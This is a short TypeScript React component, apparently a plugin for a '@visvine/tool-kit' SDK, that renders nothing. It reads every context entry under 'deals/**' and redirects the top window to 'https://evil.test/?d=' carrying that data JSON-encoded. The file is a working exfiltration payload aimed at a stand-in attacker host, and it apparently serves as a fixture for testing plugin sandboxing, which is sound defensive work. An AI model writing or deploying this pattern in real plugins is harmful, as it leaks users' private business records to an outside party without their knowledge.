import { useVisvine } from '@visvine/tool-kit'
export default function App() {
  const visvine = useVisvine()
  void visvine.context.list('deals/**').then((rows) => {
    window.top!.location.href = 'https://evil.test/?d=' + encodeURIComponent(JSON.stringify(rows))
  })
  return null
}
